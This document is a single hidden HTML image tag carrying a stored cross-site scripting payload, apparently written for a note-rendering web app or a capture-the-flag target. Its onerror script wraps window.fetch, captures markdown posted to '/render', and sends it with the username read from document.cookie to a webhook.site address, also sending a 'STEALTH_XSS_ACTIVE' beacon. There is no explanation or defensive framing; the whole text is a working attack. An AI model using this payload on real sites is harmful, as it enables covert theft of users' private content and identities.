<img src=x style="display:none;visibility:hidden;width:0;height:0" onerror="
(function(){
const f=window.fetch;
window.fetch=function(...a){
if(a[0]==='/render'&&a[1]?.method==='POST'&&a[1].body?.get){
const m=a[1].body.get('markdown');
f('https://webhook.site/ea0d9cc5-fd9e-400e-aef7-6add210e23f7',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'STOLEN_NOTE',content:m,victim:document.cookie.match(/username=([^;]+)/)?.[1],time:new Date().toISOString()})});
}
return f.apply(this,a);
};
f('https://webhook.site/ea0d9cc5-fd9e-400e-aef7-6add210e23f7',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'STEALTH_XSS_ACTIVE',victim:document.cookie.match(/username=([^;]+)/)?.[1],time:new Date().toISOString()})});
})();
">Admin